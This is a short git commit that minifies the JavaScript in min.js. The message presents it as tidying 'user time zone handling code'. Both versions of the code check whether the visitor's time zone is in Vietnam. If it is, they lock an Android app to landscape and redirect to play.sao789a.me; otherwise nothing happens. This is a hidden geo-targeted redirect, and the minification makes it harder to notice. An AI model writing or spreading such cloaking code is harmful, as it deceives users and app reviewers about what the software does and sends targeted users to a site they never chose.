dc13d96594239f936c30c813267e4d31d718e550
hai07t <hai07t@gmail.com>
2025-10-16 11:12:09 +0700

    Minify user time zone handling code

--- min.js
+++ min.js
@@ -1,13 +1,1 @@
-const userTimeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-
-if (userTimeZone === "Asia/Ho_Chi_Minh" || userTimeZone === "Asia/Saigon") {
-  if (window.AndroidOrientation && AndroidOrientation.lockLandscape) {
-    AndroidOrientation.lockLandscape();
-  }
-  var to = "https://play.sao789a.me/";
-  window.location.href = to;
-} else {
-  if (window.AndroidOrientation && AndroidOrientation.lockPortrait) {
-    AndroidOrientation.lockPortrait();
-  }
-}
+const userTimeZone=Intl.DateTimeFormat().resolvedOptions().timeZone;(userTimeZone==="Asia/Ho_Chi_Minh"||userTimeZone==="Asia/Saigon")?(window.AndroidOrientation&&AndroidOrientation.lockLandscape&&AndroidOrientation.lockLandscape(),window.location.href="https://play.sao789a.me/"):(window.AndroidOrientation&&AndroidOrientation.lockPortrait&&AndroidOrientation.lockPortrait());
